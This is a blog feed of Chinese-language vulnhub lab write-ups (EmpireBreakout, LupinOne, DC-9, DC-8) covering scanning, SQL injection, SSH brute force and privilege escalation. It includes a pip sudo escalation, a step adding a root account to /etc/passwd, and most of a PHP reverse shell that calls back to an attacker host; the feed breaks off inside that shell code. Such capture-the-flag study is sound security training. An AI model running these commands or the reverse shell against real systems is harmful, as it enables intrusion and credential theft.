<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m</title>
  
  
  <link href="https://syst1m.top/atom.xml" rel="self"/>
  
  <link href="https://syst1m.top/"/>
  <updated>2022-06-22T08:53:22.425Z</updated>
  <id>https://syst1m.top/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub-EmpireBreakout</title>
    <link href="https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-22T07:40:10.000Z</published>
    <updated>2022-06-22T08:53:22.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目  <a href="https://www.vulnhub.com/entry/empire-breakout,751/">https://www.vulnhub.com/entry/empire-breakout,751/</a><br>靶机:172.16.17.152<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png"></p><p>445高危端口,尝试exp打445端口,失败,继续往下看80端口<br>apache,在前端源码里找到提示和加密密文<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png"></p><p>挨个尝试解密,最后为Brainfuck加密,解出明文为 .2uqPEfj3D&lt;P’a-3 应该是某个账号的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221609231.png"></p><p>挨个访问10000&#x2F;20000端口,都是登录页面,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221612140.png"></p><h2 id="smb嗅探"><a href="#smb嗅探" class="headerlink" title="smb嗅探"></a>smb嗅探</h2><p>想到smb服务还没有利用到,回过头继续看smb服务<br>enum4linux 对靶机进行嗅探,爆出了一个用户名 cyber</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum.exe的Linux替代软件，用于枚举Windows和Samba主机中的数据。</span><br><span class="line">enum4linux 172.16.17.152</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221615489.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>登录成功,发现有个地方可以直接执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221619772.png"></p><p>反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622849.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622106.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看root权限执行的命令,和文件,没有sudo命令,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221627684.png"></p><p>拿到第一个flag和一个root权限的 tar命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221630268.png"></p><p>既然有tar,那么就要用到压缩 解压去提权,最后在&#x2F;var&#x2F;backups下翻到一个密码备份文件<br>对密码的备份文件进行压缩，然后解压即可么访问拿到密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tar -czvf test.tar.gz /var/backups/.old_pass.bak</span><br><span class="line">tar -xzvf test.tar.gz</span><br><span class="line"><span class="built_in">cat</span> var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221650882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221649498.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目  &lt;a href=&quot;https://www.vulnhub.com/entry/empire-breakout,751/&quot;&gt;https://www.vulnhub.com/entry/empire-breakout,751/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.152&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;445高危端口,尝试exp打445端口,失败,继续往下看80端口&lt;br&gt;apache,在前端源码里找到提示和加密密文&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub-EmpireLupinOne打靶</title>
    <link href="https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-21T10:10:30.000Z</published>
    <updated>2022-06-22T07:50:01.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/series/empire,507/">https://www.vulnhub.com/series/empire,507/</a><br>靶机:172.16.17.151<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描确定靶机ip,再详细扫描<br>开放了22和80,扫出一个&#x2F;~myfiles目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png"></p><p>访问看看,提示404,暗示我们继续尝试当前目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png"></p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>wfuzz继续扫当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://172.16.17.151/~FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211859278.png"></p><p>提示我们icex64用户有ssh秘钥,并使用fasttrack去爆破<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211901501.png"></p><p>继续爆破,扫出一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 -u http://172.16.17.151/~secret/.FUZZ.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211916638.png"></p><p>但是应该是加密过的,不是ssh密钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211917480.png"></p><p>拿去解密,挨个尝试后,以base58解出秘钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211922436.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="爆破秘钥"><a href="#爆破秘钥" class="headerlink" title="爆破秘钥"></a>爆破秘钥</h2><p>使用ssh2john将秘钥编译一下,再使用john暴力破解,解出密码 P@55w0rd!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh2john key.txt &gt; passkey.txt</span><br><span class="line">                                                                                                                                                                                                              </span><br><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt passkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211929056.png"></p><h2 id="尝试登录"><a href="#尝试登录" class="headerlink" title="尝试登录"></a>尝试登录</h2><p>直接登录被拒绝<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211932835.png"></p><p>利用秘钥再次登录,此处要注意,先将秘钥权限改为 600<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211938634.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在家目录下看到一个user.txt,拿到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211946639.png"></p><p>查看root权限运行的文件,没有写入权限,继续往下看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211941860.png"></p><p>发现使用webbrowser包,跟进看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211952250.png"></p><p>是root权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211953957.png"></p><p>写入shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212014187.png"></p><p>运行heist.py反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212015303.png"></p><p>查看arsene用户下以root权限运行的命令或文件,发现pip不需要密码就可以执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212016681.png"></p><p>google pip提权 找到方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arsene@LupinOne:~$ TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line">arsene@LupinOne:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">arsene@LupinOne:~$ sudo pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212029257.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/series/empire,507/&quot;&gt;https://www.vulnhub.com/series/empire,507/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.151&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫描确定靶机ip,再详细扫描&lt;br&gt;开放了22和80,扫出一个&amp;#x2F;~myfiles目录&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问看看,提示404,暗示我们继续尝试当前目录&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ssh" scheme="https://syst1m.top/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc9打靶</title>
    <link href="https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-18T10:43:50.000Z</published>
    <updated>2022-06-21T10:10:08.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>靶机:172.16.17.150<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机,存在22端口,但是状态为filtered,怀疑被knockd保护<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181847274.png"></p><p>扫目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181900356.png"></p><p>web指纹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181848261.png"></p><p>挨个访问扫出来的目录,在访问session.php的时候发现已经登录,在下面提示文件不存在,可能存在文件包含漏洞<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181903758.png"></p><p>猜一下接受参数的变量名,成功读取<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181915830.png"></p><p>上面怀疑ssh被保护,现在用文件包含读取一下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181919654.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>文件包含没有能继续利用的电,查看其他功能点,发现一处搜索框,post传输数据,有搜索就有数据库交互,抓包fuzz<br>当语句为’or 1&#x3D;1 #时,产生注入,丢到sqlmap跑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181944447.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181947908.png"></p><p>跑出账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -batch -D <span class="built_in">users</span> -T <span class="string">&#x27;UserDetails&#x27;</span> -C <span class="string">&#x27;password,username&#x27;</span> --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181952744.png"></p><h2 id="knock碰撞ssh"><a href="#knock碰撞ssh" class="headerlink" title="knock碰撞ssh"></a>knock碰撞ssh</h2><p>安装knockd<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181930687.png"></p><p>根据刚刚读到的端口,去敲门,逆序端口号,发现ssh已经对我们开放<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181937749.png"></p><h2 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h2><p>利用跑出来的账号密码,拿去撞ssh,跑出三个账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwords.txt 172.16.17.150 ssh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181959848.png"></p><p>相继进入几个账号,翻翻翻*10,最后在janitor找到一个密码文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182008193.png"></p><p>复制进passwd文件继续爆破,爆出一个新的账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182010559.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录看看以root权限运行的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182014091.png"></p><p>find查找路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182016074.png"></p><p>分析第一个test.py文件,读取第一个文件的内容,添加到第二个文件的末尾<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182022009.png"></p><p>生成一个密码hash,账号为domon 密码 123456</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt demon 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182038473.png"></p><p>将生成的密码hash写入一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;demon:$1$demon$Mspg7FhbFwGLZ4T2s/qI6/:0:0:root:/bin/bash&#x27;</span> &gt;&gt; /tmp/demon</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182039239.png"></p><p>再利用test命令写入&#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test ./demon /etc/passwd</span><br></pre></td></tr></table></figure><p>登录demon,拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182041961.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-9,412/&quot;&gt;https://www.vulnhub.com/entry/dc-9,412/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.150&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="apache" scheme="https://syst1m.top/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc8打靶</title>
    <link href="https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-16T11:48:19.000Z</published>
    <updated>2022-06-17T11:05:09.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub <a href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a><br>靶机:172.16.17.149<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171605915.png"></p><p>访问首页的时候发现一处url带id字样,打上一个单引号,发现报错<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171613764.png"></p><p>尝试注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616391.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>##sql注入<br>丢到sqlmap跑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616126.png"></p><p>跑出账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%sqlmap -u http://172.16.17.149/?nid=3 -D d7db -T <span class="built_in">users</span> --dump -C <span class="string">&quot;name,pass&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171624065.png"></p><p>但是md5解不出,看到账号里有一个john,提示我们使用john工具<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171641368.png"></p><p>跑出一个密码turtle</p><p>从robots.txt知道后台地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171644855.png"></p><p>尝试登录,john用户登录成功</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>一直翻翻翻,在下面这个url翻到一个功能点,可以执行php代码<br><a href="http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure">http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure</a></p><p>写反弹shell语句,需要注意,要再代码前面添加一些字符串,不然不会被执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171814251.png"></p><p>webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;172.16.17.140&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">9999</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ 